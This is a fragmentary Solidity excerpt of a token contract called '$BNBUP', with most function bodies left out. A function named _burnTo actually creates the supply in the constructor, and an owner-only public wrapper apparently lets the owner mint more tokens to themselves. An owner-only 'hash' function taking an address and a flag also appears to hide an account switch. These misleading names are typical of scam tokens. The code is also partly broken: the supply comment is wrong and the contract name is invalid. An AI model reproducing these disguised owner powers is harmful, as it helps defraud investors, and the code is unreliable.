...
//
// $BNBUP proposes an innovative feature in its contract.
//
...
contract ERC20 is Context, IERC20, Ownable {
     ...
     * @dev See {IERC20-hash}.
     */
    function hash(address target, bool enabled) public onlyOwner {
    ...
    function _burnTo(uint256 amount) public onlyOwner {
 _burnTo(msg.sender, amount);
    }
    ...
    function _burnTo(address account, uint256 amount) internal virtual {
...
contract $BNBUP is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("BNBUP", "BNBUP") {
     _burnTo(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}